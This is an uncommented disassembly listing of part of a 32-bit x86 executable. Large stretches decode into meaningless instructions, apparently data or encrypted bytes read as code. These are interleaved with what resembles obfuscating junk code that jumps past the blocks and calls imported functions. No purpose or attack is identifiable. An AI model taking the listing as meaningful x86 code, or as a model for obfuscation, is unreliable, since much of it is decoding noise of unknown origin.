  408d69:	lock jp 0x408cf9
  408d6c:	(bad)  
  408d6d:	js     0x408d3d
  408d6f:	mov    ebp,0x2d2ba0d3
  408d74:	in     eax,0x3
  408d76:	mov    eax,0xbe488f47
  408d7b:	punpckhbw mm5,QWORD PTR [ebx]
  408d7e:	les    ecx,FWORD PTR [ebp+ecx*4-0x5b]
  408d82:	lock mov edi,0x45a9299
  408d88:	adc    al,0x4c
  408d8a:	mov    esp,0xa76011a2
  408d8f:	inc    ebx
  408d90:	dec    eax
  408d91:	pop    ebp
  408d92:	mov    DWORD PTR [edi-0x1b],eax
  408d95:	jmp    0x408d55
  408d97:	gs out 0xc2,eax
  408d9a:	xor    BYTE PTR [ecx],dh
  408d9c:	jmp    0x6997:0x4071e788
  408da3:	adc    cl,BYTE PTR [edi]
  408da5:	adc    ch,bh
  408da7:	sbb    DWORD PTR [eax],ebp
  408da9:	sub    eax,edx
  408dab:	inc    eax
  408dac:	test   DWORD PTR [edx-0x7656aef4],eax
  408db2:	lea    edx,[eax+0xe]
  408db5:	lods   al,BYTE PTR ds:[esi]
  408db6:	fs mov eax,0xe8e8df70
  408dbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408dbd:	ss xchg ecx,esp
  408dc0:	aas    
  408dc1:	adc    BYTE PTR ss:[edx+0x7f],dl
  408dc5:	imul   esi,DWORD PTR [eax],0xffffffcc
  408dc8:	call   0xaf73:0x65ef5190
  408dcf:	jecxz  0x408e3c
  408dd1:	nop
  408dd2:	mov    bl,0x56
  408dd4:	inc    esp
  408dd5:	in     al,dx
  408dd6:	adc    al,0xb8
  408dd8:	and    eax,0x91153397
  408ddd:	jmp    0x6bac3dd7
  408de2:	lahf   
  408de3:	aaa    
  408de4:	out    dx,al
  408de5:	idiv   ebx
  408de7:	retf   0xae17
  408dea:	(bad)  
  408deb:	pop    ebp
  408dec:	adc    BYTE PTR [ebx],ah
  408dee:	dec    ecx
  408def:	jne    0x408d71
  408df1:	jb     0x408e02
  408df3:	test   DWORD PTR [ebx],ecx
  408df5:	mov    edx,0xf415165e
  408dfa:	fld    QWORD PTR [ecx+0x22f8edf5]
  408e00:	stos   BYTE PTR es:[edi],al
  408e01:	cs jb  0x408dcb
  408e04:	inc    BYTE PTR [ecx+ebx*4-0x2e]
  408e08:	sbb    eax,0x1931043e
  408e0d:	jp     0x408e3b
  408e0f:	inc    ebp
  408e10:	mov    ebx,0x6b61ff59
  408e15:	push   edx
  408e16:	leave  
  408e17:	dec    edx
  408e18:	jnp    0x408e1b
  408e1a:	leave  
  408e1b:	xchg   ebx,eax
  408e1c:	and    al,0x28
  408e1e:	mov    esi,0xa4c4c78d
  408e23:	dec    ebp
  408e24:	into   
  408e25:	sbb    ebx,DWORD PTR [ecx]
  408e27:	retf   0x34
  408e2a:	pushf  
  408e2b:	into   
  408e2c:	imul   edi,DWORD PTR [ecx+0x3c],0x4a
  408e30:	fwait
  408e31:	pop    esp
  408e32:	xchg   esi,eax
  408e33:	or     DWORD PTR fs:0xd15da09e,eax
  408e3a:	scas   al,BYTE PTR es:[edi]
  408e3b:	nop
  408e3c:	jne    0x408e88
  408e3e:	cmp    eax,0xaca48f20
  408e43:	fs and al,0x58
  408e46:	add    al,0x87
  408e48:	dec    ecx
  408e49:	enter  0x99c8,0x6e
  408e4d:	pop    ss
  408e4e:	sahf   
  408e4f:	mov    edx,0xbaa2cb76
  408e54:	shl    DWORD PTR [ebp+0x19],0x75
  408e58:	inc    esi
  408e59:	jmp    0xebf803d6
  408e5e:	jmp    0xdbb0:0xce7f4e4b
  408e65:	adc    DWORD PTR [eax+0x37],0x5c3e5ff7
  408e6c:	ins    DWORD PTR es:[edi],dx
  408e6d:	or     eax,DWORD PTR [edi-0x2b]
  408e70:	and    BYTE PTR [ecx+eax*2+0x67ad53cb],ch
  408e77:	je     0x408ec3
  408e79:	nop
  408e7a:	repnz sbb al,BYTE PTR ds:0xec83bbfe
  408e81:	xor    bh,al
  408e83:	inc    ebp
  408e84:	call   0xcbba43ff
  408e89:	mov    eax,0x9c2b8ae8
  408e8e:	neg    ecx
  408e90:	mov    DWORD PTR [ebp-0x14],eax
  408e93:	adc    DWORD PTR ds:0x428439,0x14e
  408e9d:	jmp    0x40911c
  408ea2:	outs   dx,DWORD PTR ds:[esi]
  408ea3:	in     eax,0x49
  408ea5:	rcr    BYTE PTR [esp+esi*2+0x7b],1
  408ea9:	retw   
  408eab:	dec    ebx
  408eac:	jo     0x408e8b
  408eae:	daa    
  408eaf:	cmc    
  408eb0:	je     0x408e8f
  408eb2:	jp     0x408f31
  408eb4:	mov    esi,0xbec279be
  408eb9:	mov    esi,0x8a919cad
  408ebe:	sub    eax,DWORD PTR [esi*4-0x54a5dba6]
  408ec5:	into   
  408ec6:	cmp    al,BYTE PTR [ecx-0x3a49bd65]
  408ecc:	(bad)  
  408ecd:	rol    DWORD PTR [bp+0xe],1
  408ed1:	or     bh,dh
  408ed3:	sub    dh,ah
  408ed5:	mov    dl,0xb2
  408ed7:	aaa    
  408ed8:	loope  0x408edd
  408eda:	pop    esp
  408edb:	or     eax,0x7bee7426
  408ee0:	test   al,0xbc
  408ee2:	push   edx
  408ee3:	cmp    DWORD PTR [esi-0x21],eax
  408ee6:	inc    ebx
  408ee7:	or     bl,BYTE PTR [ebx-0x20a9a7f]
  408eed:	gs inc ecx
  408eef:	jmp    0xd70:0xaee4
  408ef5:	xor    bh,dl
  408ef7:	mov    edx,DWORD PTR [ecx+0x3fc2c9d7]
  408efd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408efe:	sub    eax,0xffffffee
  408f01:	test   eax,0xab876c1a
  408f06:	mov    WORD PTR ds:0x90a23a23,?
  408f0c:	test   al,0x8f
  408f0e:	test   DWORD PTR [esi],eax
  408f10:	aaa    
  408f11:	add    eax,0x4a88ad82
  408f16:	pop    esp
  408f17:	push   ebp
  408f18:	in     al,0x78
  408f1a:	push   edx
  408f1b:	(bad)  
  408f1d:	push   ecx
  408f1e:	jecxz  0x408ee8
  408f20:	div    bl
  408f22:	pop    ss
  408f23:	push   ebp
  408f24:	mov    bh,0xd9
  408f26:	mov    dl,0xeb
  408f28:	cld    
  408f29:	mov    eax,0x3ef87971
  408f2e:	fsub   QWORD PTR [edx]
  408f30:	(bad)  
  408f31:	mov    al,0x16
  408f33:	sbb    al,0xec
  408f35:	pusha  
  408f36:	(bad)  
  408f37:	xor    dh,BYTE PTR [edi]
  408f39:	fstp   st(5)
  408f3b:	mov    ebx,0xee0d5632
  408f40:	xor    edx,DWORD PTR [ecx]
  408f42:	cdq    
  408f43:	int3   
  408f44:	and    BYTE PTR [edx],ah
  408f46:	jg     0x408f29
  408f48:	sbb    edx,DWORD PTR ds:0xfc6516f9
  408f4e:	or     BYTE PTR [esi+0x2bc66a4e],bl
  408f54:	rol    DWORD PTR [edi+eax*4],cl
  408f57:	icebp  
  408f58:	cmp    esi,DWORD PTR ds:0x103d3ec4
  408f5e:	ret    0xb9aa
  408f61:	mov    ds,WORD PTR [esi]
  408f63:	stc    
  408f64:	xchg   ebx,eax
  408f65:	jbe    0x408f95
  408f67:	fcomip st,st(6)
  408f69:	dec    esi
  408f6a:	push   eax
  408f6b:	les    esi,FWORD PTR [edi]
  408f6d:	add    eax,0x9142f2d4
  408f72:	ficom  DWORD PTR [ecx+0x54]
  408f75:	test   dh,dh
  408f77:	call   FWORD PTR [edi]
  408f79:	inc    ebx
  408f7a:	push   ds
  408f7b:	mov    ds:0x8614a29b,al
  408f80:	stc    
  408f81:	xor    dh,BYTE PTR [eax]
  408f83:	push   cs
  408f84:	aam    0xa1
  408f86:	aas    
  408f87:	fsub   DWORD PTR [eax]
  408f89:	cmp    BYTE PTR [ecx-0x71],dh
  408f8c:	mov    ds:0x6a93f68f,eax
  408f91:	pop    edi
  408f92:	lods   al,BYTE PTR ds:[esi]
  408f93:	ins    DWORD PTR es:[edi],dx
  408f94:	sub    al,0xa4
  408f96:	sbb    DWORD PTR [ebx-0x20],0xffffffc0
  408f9a:	in     al,dx
  408f9b:	int3   
  408f9c:	neg    DWORD PTR [esi+0x26]
  408f9f:	add    esi,ebx
  408fa1:	xchg   edx,eax
  408fa2:	aad    0x71
  408fa4:	add    esp,DWORD PTR [ebx-0xad95fa]
  408faa:	cwde   
  408fab:	es xchg ecx,eax
  408fad:	xor    eax,DWORD PTR [eax-0x332c309b]
  408fb3:	cs push ebp
  408fb5:	push   ebx
  408fb6:	pop    ss
  408fb7:	cmc    
  408fb8:	cmp    ch,ah
  408fba:	test   edx,esp
  408fbc:	mov    ds:0x352cea97,al
  408fc1:	xchg   DWORD PTR [ecx],eax
  408fc3:	push   es
  408fc4:	das    
  408fc5:	cmp    BYTE PTR ds:0x66bef4eb,dh
  408fcb:	lods   al,BYTE PTR ds:[esi]
  408fcc:	cmc    
  408fcd:	push   esp
  408fce:	or     al,0x4e
  408fd0:	daa    
  408fd1:	and    eax,0xabad9391
  408fd6:	in     al,0x6a
  408fd8:	int3   
  408fd9:	fdivr  DWORD PTR [ebp+0x588ad456]
  408fdf:	sbb    ch,BYTE PTR [esi-0x62]
  408fe2:	inc    edi
  408fe3:	mov    BYTE PTR [esi-0x496080b8],cl
  408fe9:	dec    eax
  408fea:	mov    cl,BYTE PTR [edx+0x68]
  408fed:	jge    0x408fc5
  408fef:	dec    edx
  408ff0:	into   
  408ff1:	mov    bl,0x57
  408ff3:	jo     0x408fd8
  408ff5:	sbb    eax,edi
  408ff7:	cmc    
  408ff8:	dec    esi
  408ff9:	jnp    0x408fac
  408ffb:	ret    0xf54d
  408ffe:	cmp    eax,eax
  409000:	dec    ecx
  409001:	cmp    DWORD PTR [eax],edx
  409003:	mov    ds:0x34fca067,al
  409008:	test   BYTE PTR [edi*2-0x3e7c4db1],0x27
  409010:	adc    DWORD PTR [edx],edi
  409012:	lock pop ecx
  409014:	fwait
  409015:	mov    al,0xff
  409017:	jbe    0x408ff5
  409019:	jae    0x409008
  40901b:	dec    ebp
  40901c:	mov    dl,0xcf
  40901e:	xchg   ebx,eax
  40901f:	aad    0xfc
  409021:	inc    eax
  409022:	cmc    
  409023:	cmc    
  409024:	xchg   edi,eax
  409025:	adc    esi,ebp
  409027:	rcr    DWORD PTR [ebp+0x252ed210],cl
  40902d:	stos   DWORD PTR es:[edi],eax
  40902e:	jo     0x408fc7
  409030:	fst    QWORD PTR [edx]
  409032:	sub    ebx,esi
  409034:	(bad)  
  409035:	int    0x60
  409037:	xchg   edx,eax
  409038:	js     0x40905c
  40903a:	fwait
  40903b:	setle  BYTE PTR [esi-0x4a]
  40903f:	(bad)  
  409040:	mov    ah,0x20
  409042:	mov    ds:0x77b2bf17,eax
  409047:	mov    WORD PTR [eax-0x4ae380ab],es
  40904d:	xchg   esp,eax
  40904e:	sbb    BYTE PTR [eax+0x5723abf6],dl
  409054:	or     al,BYTE PTR [ecx-0x4c3e5843]
  40905a:	xor    al,0x1a
  40905c:	pop    DWORD PTR [ebx+edx*2]
  40905f:	push   es
  409060:	xchg   edx,eax
  409061:	loope  0x4090d1
  409063:	add    al,0x9d
  409065:	cmp    BYTE PTR [esi],dh
  409067:	out    0x8e,al
  409069:	test   al,0x25
  40906b:	in     eax,dx
  40906c:	pop    ebp
  40906d:	ret    0x1baa
  409070:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409071:	xchg   BYTE PTR [eax-0x6e],dl
  409074:	push   ecx
  409075:	inc    esp
  409076:	jo     0x409037
  409078:	jb     0x40909a
  40907a:	sub    edx,edi
  40907c:	push   edi
  40907d:	fidiv  DWORD PTR [edx-0x5dd345f1]
  409083:	scas   al,BYTE PTR es:[edi]
  409084:	stos   BYTE PTR es:[edi],al
  409085:	es jno 0x409082
  409088:	sbb    edi,ebx
  40908a:	aas    
  40908b:	mov    eax,0x6557caa3
  409090:	mov    BYTE PTR [ecx-0x10fc39d7],dh
  409096:	sbb    eax,0xabb23ca6
  40909b:	data16 rcr BYTE PTR [ebp-0x80],1
  40909f:	(bad)  
  4090a0:	cmp    DWORD PTR [ebx],edi
  4090a2:	add    DWORD PTR [edi],esp
  4090a4:	mov    ebx,0x6a13067e
  4090a9:	add    BYTE PTR [edx],0xb4
  4090ac:	aaa    
  4090ad:	xchg   esp,eax
  4090ae:	outs   dx,BYTE PTR ds:[esi]
  4090af:	cmp    bh,dh
  4090b1:	out    dx,eax
  4090b2:	push   cs
  4090b3:	push   edi
  4090b4:	inc    esp
  4090b5:	add    BYTE PTR [ebx],dl
  4090b7:	sbb    eax,ebp
  4090b9:	xchg   esp,eax
  4090ba:	mov    ebx,0x4d565372
  4090bf:	dec    ecx
  4090c0:	mov    bh,0xf7
  4090c2:	jbe    0x40913e
  4090c4:	lock xchg edx,eax
  4090c6:	aas    
  4090c7:	dec    ebx
  4090c8:	ja     0x4090b9
  4090ca:	xor    ch,ah
  4090cc:	sub    BYTE PTR [eax-0x1194d9db],dh
  4090d2:	sbb    dh,ah
  4090d4:	fild   WORD PTR [ecx+0x5e]
  4090d7:	(bad)  
  4090d8:	sbb    cl,ah
  4090da:	jecxz  0x409068
  4090dc:	cmp    DWORD PTR [ecx-0x1445db0b],esi
  4090e2:	stc    
  4090e3:	sub    cl,BYTE PTR [ebp+0x25]
  4090e6:	int    0x92
  4090e8:	fcmovu st,st(2)
  4090ea:	add    BYTE PTR [esi-0x7014b591],dh
  4090f0:	inc    edi
  4090f1:	fisubr DWORD PTR ds:0xf3c9de23
  4090f7:	mov    bl,0xcc
  4090f9:	ins    DWORD PTR es:[edi],dx
  4090fa:	pop    esi
  4090fb:	das    
  4090fc:	(bad)  
  4090fd:	mov    dh,0x3f
  4090ff:	push   esp
  409100:	nop
  409101:	stos   DWORD PTR es:[edi],eax
  409102:	in     eax,0x32
  409104:	test   eax,0x4b131b5c
  409109:	mov    eax,0x8e2d7b1d
  40910e:	cmp    al,0xa0
  409110:	dec    ebp
  409111:	popa   
  409112:	retw   0xef62
  409116:	xchg   ebx,eax
  409117:	lock test BYTE PTR [esi],bh
  40911a:	dec    esi
  40911b:	fcmovb st,st(7)
  40911d:	inc    ebp
  40911e:	shl    BYTE PTR [edx-0x4b],1
  409121:	jns    0x4090ee
  409123:	mov    DWORD PTR [ebp-0x2c],eax
  409126:	cmp    DWORD PTR ds:0x428561,0x0
  40912d:	mov    DWORD PTR ds:0x42855d,0x24a6
  409137:	mov    DWORD PTR ds:0x428411,0x40da
  409141:	jmp    0x4091a4
  409146:	not    eax
  409148:	mov    DWORD PTR ds:0x4284b5,0x7db9
  409152:	cmp    DWORD PTR ds:0x428561,0x0
  409159:	jae    0x409182
  40915f:	push   0x1999
  409164:	push   0x428137
  409169:	push   0x4282e3
  40916e:	call   DWORD PTR ds:0x42e0c8
  409174:	sub    ecx,DWORD PTR ds:0x428359
  40917a:	and    ecx,ecx
  40917c:	adc    DWORD PTR ds:0x4283f9,ebx
  409182:	mov    ecx,DWORD PTR ds:0x428461
  409188:	add    DWORD PTR ds:0x428331,ecx
  40918e:	neg    DWORD PTR ds:0x428325
  409194:	xor    DWORD PTR ds:0x4284e5,ebx
  40919a:	or     DWORD PTR ds:0x428419,0x673
  4091a4:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  4091ab:	mov    DWORD PTR [ebp-0x24],0x29bd2
  4091b2:	mov    DWORD PTR [ebp-0x20],0x6ec3
  4091b9:	sbb    eax,ecx
  4091bb:	push   esi
  4091bc:	mov    DWORD PTR [ebp-0x1c],0x2a74
  4091c3:	xor    ecx,ecx
  4091c5:	xor    ecx,DWORD PTR ds:0x4283a9
  4091cb:	mov    eax,ds:0x42851d
  4091d0:	sub    ecx,eax
  4091d2:	or     ecx,DWORD PTR [ecx+eax*1]
  4091d5:	mov    DWORD PTR [ebp-0x10],0x2e2c
  4091dc:	push   0x5285
  4091e1:	or     DWORD PTR ds:0x428331,ecx
  4091e7:	mov    DWORD PTR [ebp-0xc],0x3d0a
  4091ee:	and    ecx,ecx
  4091f0:	mov    eax,DWORD PTR [ebp-0x10]
  4091f3:	and    ecx,DWORD PTR ds:0x4284e1
  4091f9:	mov    ecx,DWORD PTR [ebp-0xc]
  4091fc:	sub    DWORD PTR ds:0x4284e1,0x428569
  409206:	push   0x712c
  40920b:	or     DWORD PTR ds:0x4284ed,0x428409
  409215:	push   ecx
  409216:	sbb    DWORD PTR ds:0x4284dd,0x3312
  409220:	push   eax
  409221:	call   0x41594e
  409226:	and    DWORD PTR ds:0x4284dd,edi
  40922c:	mov    ecx,DWORD PTR [ebp-0x20]
  40922f:	mov    esi,DWORD PTR [ebp-0x1c]
  409232:	and    DWORD PTR ds:0x4284e9,0x428401
  40923c:	push   0x5f43
  409241:	and    DWORD PTR ds:0x428431,0x42854d
  40924b:	or     edx,0x69b4
  409251:	push   0x1657
  409256:	or     eax,0x528b
  40925b:	xor    edx,esi
  40925d:	xor    eax,ecx
  40925f:	xor    DWORD PTR ds:0x428415,0x4284b9
  409269:	push   edx
  40926a:	push   eax
  40926b:	or     DWORD PTR ds:0x428359,0x42c0
  409275:	call   0x41594e
  40927a:	mov    esi,DWORD PTR ds:0x42841d
  409280:	xor    esi,DWORD PTR ds:0x428455
  409286:	mov    DWORD PTR ds:0x42841d,esi
  40928c:	mov    ecx,DWORD PTR [ebp-0x28]
  40928f:	and    esi,DWORD PTR ds:0x428559
  409295:	jmp    0x409514
  40929a:	aam    0x9e
  40929c:	jp     0x409286
  40929e:	mov    esp,0xba543b
  4092a3:	ret    0x923c
  4092a6:	inc    esp
  4092a7:	pop    ebp
  4092a8:	nop
  4092a9:	nop
  4092aa:	xor    eax,0x79bebe83
  4092af:	ret    0xbebe
  4092b2:	add    BYTE PTR [esi+0x4],dh
  4092b5:	ret    0x9c67
  4092b8:	push   ss
  4092b9:	jb     0x4092e1
  4092bb:	jle    0x409328
  4092bd:	sbb    BYTE PTR [edx-0x52686b93],bl
  4092c3:	in     eax,0x69
  4092c5:	in     eax,dx
  4092c6:	sahf   
  4092c7:	sahf   
  4092c8:	adc    bl,al
  4092ca:	scas   al,BYTE PTR es:[edi]
  4092cb:	mov    ebx,DWORD PTR [eax]
  4092cd:	sub    BYTE PTR [esi+0x61124212],dh
  4092d3:	ficomp DWORD PTR [esi+ebx*2]
  4092d6:	dec    ebp
  4092d7:	and    bh,BYTE PTR [ebx+edi*8+0x6684d9b4]
  4092de:	test   al,0x76
  4092e0:	jnp    0x409269
  4092e2:	adc    bh,ah
  4092e4:	push   cs
  4092e5:	int3   
  4092e6:	sbb    eax,ebx
  4092e8:	rol    BYTE PTR [ebx+0x3b],0xee
  4092ec:	and    eax,0xc17c65ff
  4092f1:	and    edx,DWORD PTR [eax-0x26852833]
  4092f7:	das    
  4092f8:	adc    bl,BYTE PTR [eax-0x28]
  4092fb:	ins    BYTE PTR es:[edi],dx
  4092fc:	enter  0x49cd,0x38
  409300:	push   ds
  409301:	pop    ecx
  409302:	aas    
  409303:	lods   al,BYTE PTR ds:[esi]
  409304:	sub    esp,DWORD PTR [esi-0x3c097e43]
  40930a:	lea    ecx,[ebp+0x7f]
  40930d:	adc    BYTE PTR [ecx+0x6a142288],al
  409313:	(bad)  
  409314:	mov    al,0xa3
  409316:	loop   0x40933f
  409318:	push   ss
  409319:	mov    edi,0xffdc302c
  40931e:	fimul  DWORD PTR [ecx]
  409320:	inc    ebx
  409321:	push   cs
  409322:	enter  0xf4be,0xca
  409326:	std    
  409327:	ficomp DWORD PTR [edx]
  409329:	xor    ch,ah
  40932b:	pop    eax
  40932c:	mov    ?,WORD PTR [edi+eiz*4]
  40932f:	add    edi,DWORD PTR [edx+0x1a]
  409332:	xchg   esi,eax
  409333:	sub    BYTE PTR [edx-0x22],0x62
  409337:	jmp    0x40937c
  409339:	jp     0x4092e1
  40933b:	xchg   edi,eax
  40933c:	add    DWORD PTR [ecx-0x5fd8adf2],esp
  409342:	loopne 0x409388
  409344:	jo     0x40931b
  409346:	ins    BYTE PTR es:[edi],dx
  409347:	lea    esp,[ebp+0xc]
  40934a:	push   edx
  40934b:	test   eax,0xc3af18bb
  409350:	sbb    eax,DWORD PTR [eax+0x4e]
  409353:	scas   al,BYTE PTR es:[edi]
  409354:	adc    dh,bl
  409356:	repnz or ecx,esp
  409359:	or     eax,0x5167c9d2
  40935e:	fcmove st,st(2)
  409360:	(bad)  [eax-0x5b]
  409363:	stc    
  409364:	add    bh,0x67
  409367:	aad    0x3c
  409369:	xchg   ebx,eax
  40936a:	jl     0x409386
  40936c:	shr    BYTE PTR [edi],1
  40936e:	enter  0x63d,0xf
  409372:	xor    BYTE PTR [edx+0x70],bl
  409375:	std    
  409376:	mul    DWORD PTR [esi]
  409378:	xlat   BYTE PTR ss:[ebx]
  40937a:	ins    DWORD PTR es:[edi],dx
  40937b:	mov    eax,0x27241072
  409380:	mov    bh,0x3
  409382:	cmp    DWORD PTR [ebx+0x2e],edi
  409385:	jne    0x4093d9
  409387:	add    al,bh
  409389:	leave  
  40938a:	add    ecx,DWORD PTR [edi-0x29]
  40938d:	inc    BYTE PTR [esi-0x37]
  409390:	mov    eax,0xbded8350
  409395:	int3   
  409396:	sub    ebx,DWORD PTR [edx-0x5fef456d]
  40939c:	push   es
  40939d:	adc    eax,0x80e5f4ae
  4093a2:	shr    dh,cl
  4093a4:	pop    edi
  4093a5:	aam    0x69
  4093a7:	xchg   ebx,eax
  4093a8:	out    0xaa,eax
  4093aa:	lods   eax,DWORD PTR ds:[esi]
  4093ab:	dec    edi
  4093ac:	cld    
  4093ad:	mov    bl,ch
  4093af:	mov    ecx,0x414f7d59
  4093b4:	iret   
  4093b5:	aad    0x92
  4093b7:	call   0xad0:0x33217233
  4093be:	add    eax,eax
  4093c0:	(bad)  
  4093c1:	xor    esp,eax
  4093c3:	sbb    eax,0xb3782e23
  4093c8:	dec    edx
  4093c9:	push   ss
  4093ca:	leave  
  4093cb:	jp     0x409372
  4093cd:	sub    bh,BYTE PTR [eax]
  4093cf:	mov    al,ds:0xbec6ad08
  4093d4:	pop    esp
  4093d5:	mov    bl,0x15
  4093d7:	cmp    BYTE PTR [edx],dh
  4093d9:	out    dx,al
  4093da:	sub    BYTE PTR [ebx+0x78],dh
  4093dd:	dec    eax
  4093de:	sbb    al,0x76
  4093e0:	sbb    DWORD PTR [edi+0x681d3d5a],0xffffffe2
  4093e7:	dec    esi
  4093e8:	sbb    ecx,DWORD PTR [ecx+eiz*8+0x51]
  4093ec:	fwait
  4093ed:	dec    esp
  4093ee:	push   eax
  4093ef:	repnz fwait
  4093f1:	adc    eax,0xfea93ca3
  4093f6:	pop    edi
  4093f7:	xchg   esp,esi
  4093f9:	push   ss
  4093fa:	ja     0x4093cf
  4093fc:	pop    edi
  4093fd:	test   BYTE PTR [ebp+eiz*2+0x109bd532],ch
  409404:	iret   
  409405:	sub    al,0x8c
  409407:	cmp    DWORD PTR [ecx],ebp
  409409:	dec    ebx
  40940a:	jg     0x40938f
  40940c:	or     eax,0xd33f3102
  409411:	push   ebx
  409412:	jg     0x40946f
  409414:	leave  
  409415:	jb     0x4093d9
  409417:	add    BYTE PTR [eax],ch
  409419:	sub    eax,0x48ba472c
  40941e:	repnz cld 
  409420:	jbe    0x409403
  409422:	outs   dx,DWORD PTR ds:[esi]
  409423:	pop    ebx
  409424:	test   al,0x71
  409426:	sahf   
  409427:	icebp  
  409428:	inc    ebp
  409429:	ret    0x7a4a
  40942c:	mov    dl,dh
  40942e:	ja     0x409442
  409430:	pop    esp
  409431:	es jecxz 0x40943d
  409434:	cdq    
  409435:	and    DWORD PTR [esi-0x4fa35a4e],edx
  40943b:	in     al,dx
  40943c:	sbb    eax,0x25451825
  409441:	mov    ds:0x186a585e,eax
  409446:	pop    ebp
  409447:	(bad)  
  409448:	push   ss
  409449:	mov    bl,0x8
  40944b:	jbe    0x4093fb
  40944d:	cmp    al,0x50
  40944f:	out    0xf0,eax
  409451:	cmp    al,0x39
  409453:	mov    eax,0x9a386493
  409458:	xor    DWORD PTR [eax+0x5f222f5a],ebp
  40945e:	cmc    
  40945f:	aas    
  409460:	sub    bh,BYTE PTR [esi-0x16]
  409463:	aas    
  409464:	or     bh,ah
  409466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409467:	dec    ecx
  409468:	mov    al,ds:0x2415fc7c
  40946d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40946e:	jmp    DWORD PTR [ecx]
  409470:	fwait
  409471:	add    edx,DWORD PTR [eax]
  409473:	or     al,BYTE PTR [eax-0x17]
  409476:	enter  0x4700,0x9
  40947a:	jecxz  0x409462
  40947c:	or     dh,BYTE PTR [eax+0x6b876d7d]
  409482:	jle    0x4094f1
  409484:	jp     0x4094d7
  409486:	push   esi
  409487:	div    DWORD PTR [ecx-0x13]
  40948a:	sbb    DWORD PTR [esi+0x4389ab17],eax
  409490:	mov    esi,ebp
  409492:	jl     0x40944a
  409494:	mov    al,ds:0x1ae5c187
  409499:	mov    esp,0x59bba76d
  40949e:	ret    
  40949f:	cs mov edx,0xfcbddbf9
  4094a5:	pop    ecx
  4094a6:	fnstcw WORD PTR [edx+0xb7bb3e8]
  4094ac:	pushf  
  4094ad:	mov    edi,0x35313570
  4094b2:	stos   DWORD PTR es:[edi],eax
  4094b3:	jb     0x409500
  4094b5:	(bad)  
  4094b7:	sub    eax,0xce2d8da2
  4094bc:	sbb    al,0x3a
  4094be:	dec    edx
  4094bf:	mov    eax,0x67720bf3
  4094c4:	dec    ecx
  4094c5:	data16 mov WORD PTR ds:0x7d8ba0b8,?
  4094cc:	mov    ds,eax
  4094ce:	push   edx
  4094cf:	sbb    eax,0x590e48b1
  4094d4:	int    0x3c
  4094d6:	dec    esp
  4094d7:	inc    esp
  4094d8:	or     BYTE PTR [edi-0x2a],dl
  4094db:	sbb    esi,DWORD PTR [ecx-0x1474b975]
  4094e1:	jo     0x409471
  4094e3:	or     eax,0x6710debf
  4094e8:	xor    DWORD PTR [edi],edx
  4094ea:	cmp    BYTE PTR [ecx-0x63866186],bh
  4094f0:	cmp    eax,0x4f959f66
  4094f5:	inc    edi
  4094f6:	repnz sti 
  4094f8:	scas   al,BYTE PTR es:[edi]
  4094f9:	adc    ch,BYTE PTR [ebp+ebx*1+0x59]
  4094fd:	dec    ebx
  4094fe:	scas   eax,DWORD PTR es:[edi]
  4094ff:	xchg   DWORD PTR [edx-0x2c3b2005],ecx
  409505:	dec    esp
  409506:	pop    ss
  409507:	(bad)  
  409508:	inc    ebx
  409509:	push   esi
  40950a:	adc    al,0x22
  40950c:	pop    eax
  40950d:	mov    ebx,0xa81dd180
  409512:	fs js  0x4094a0
  409515:	jne    0x4094f3
  409517:	adc    DWORD PTR ds:0x42833d,0x61cb
  409521:	push   esi
  409522:	dec    DWORD PTR ds:0x428331
  409528:	push   ecx
  409529:	not    DWORD PTR ds:0x428541
  40952f:	push   edx
  409530:	adc    DWORD PTR ds:0x428441,0x42845d
  40953a:	push   eax
  40953b:	sbb    DWORD PTR ds:0x428335,0x42833d
  409545:	call   0x42226c
  40954a:	mov    DWORD PTR [ebp-0x30],eax
  40954d:	cmp    DWORD PTR ds:0x428429,0x0
  409554:	mov    ecx,0x19e0
  409559:	mov    DWORD PTR ds:0x428539,0x71a7
  409563:	mov    ecx,0x1714
  409568:	jmp    0x4095c4
  40956d:	movzx  eax,BYTE PTR ds:0x428425
  409574:	mov    eax,0x70fc
  409579:	cmp    DWORD PTR ds:0x428429,0x0
  409580:	jb     0x4095ac
  409586:	push   0x428441
  40958b:	push   0x4282e3
  409590:	call   DWORD PTR ds:0x42e24c
  409596:	and    DWORD PTR ds:0x42854d,0x600c
  4095a0:	add    ecx,DWORD PTR ds:0x42843d
  4095a6:	or     ecx,DWORD PTR ds:0x428455
  4095ac:	adc    ecx,esi
  4095ae:	sbb    DWORD PTR ds:0x4284dd,edx
  4095b4:	sbb    DWORD PTR ds:0x428431,0x1a7e
  4095be:	add    esi,0x6267
  4095c4:	mov    DWORD PTR [ebp-0x2c],edx
  4095c7:	mov    DWORD PTR [ebp-0x10],0x5fa8
  4095ce:	mov    DWORD PTR [ebp-0xc],0x1751
  4095d5:	or     DWORD PTR ds:0x428455,0x428571
  4095df:	mov    DWORD PTR [ebp-0x20],0x5e90
  4095e6:	sub    DWORD PTR ds:0x428405,ecx
  4095ec:	mov    DWORD PTR [ebp-0x1c],0xfc1
  4095f3:	mov    edx,DWORD PTR ds:0x4283d9
  4095f9:	mov    edx,DWORD PTR [edx]
  4095fb:	adc    DWORD PTR ds:0x42834d,edx
  409601:	mov    DWORD PTR [ebp-0x28],0x7044
  409608:	or     DWORD PTR ds:0x42841d,0x3ffc
  409612:	mov    DWORD PTR [ebp-0x24],0x7bf
  409619:	mov    eax,DWORD PTR [ebp-0x28]
  40961c:	adc    ecx,0x6b26
  409622:	mov    ecx,DWORD PTR [ebp-0x24]
  409625:	add    DWORD PTR ds:0x428561,edi
  40962b:	mov    edx,DWORD PTR [ebp-0x20]
  40962e:	cmp    DWORD PTR ds:0x428425,0x0
  409635:	mov    DWORD PTR ds:0x42842d,edi
  40963b:	mov    DWORD PTR ds:0x4283f5,ecx
  409641:	mov    DWORD PTR ds:0x428435,0x2db2
  40964b:	jmp    0x409715
  409650:	mov    esi,DWORD PTR ds:0x428431
  409656:	mov    DWORD PTR ds:0x4284c9,ebx
  40965c:	cmp    DWORD PTR ds:0x428425,0x0
  409663:	jg     0x409686
  409669:	push   0x3d0d
  40966e:	call   DWORD PTR ds:0x42e000
  409674:	xor    DWORD PTR ds:0x428429,ecx
  40967a:	sbb    DWORD PTR ds:0x428425,edi
  409680:	dec    DWORD PTR ds:0x428339
  409686:	mov    esi,DWORD PTR ds:0x428325
